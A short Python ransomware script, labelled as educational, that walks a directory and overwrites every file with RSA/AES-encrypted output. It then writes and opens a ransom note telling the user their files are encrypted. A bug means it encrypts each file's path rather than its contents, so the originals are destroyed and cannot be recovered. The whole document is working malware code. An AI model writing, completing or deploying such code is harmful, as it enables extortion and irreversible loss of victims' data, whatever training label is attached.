#This code is for educational and training purposes only - EL
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import subprocess


recipient_key = RSA.import_key(open("my_public_key.pem").read())

start_path = "\\myNewDirectory"
os.chdir(start_path)

for dirpath, dirnames, filenames in os.walk(start_path):
    #print("Current Directory: " + dirpath)

    #print("Subdirectories: ")
    for dirname in dirnames:
        #print(os.path.join(dirpath, dirname))
        pass
    #print("Files: ")
    for filename in filenames: 

        file_to_encrypt = os.path.join(dirpath, filename)
        data = file_to_encrypt.encode("utf-8")

        session_key = get_random_bytes(16)

        rsa_cipher = PKCS1_OAEP.new(recipient_key)
        encrypt_session_key = rsa_cipher.encrypt(session_key)

        aes_cipher = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = aes_cipher.encrypt_and_digest(data)

        with open(file_to_encrypt, "wb") as file:
            [file.write(item) for item in (encrypt_session_key, aes_cipher.nonce, tag, ciphertext)]


notepad_path = "C:\\Message.txt"

with open(notepad_path, "w") as file:
    file.write("Hi,\n\nYour files have been encrypted.\n\nPlease access the following link for further instruction.")

subprocess.run(["notepad.exe", notepad_path])

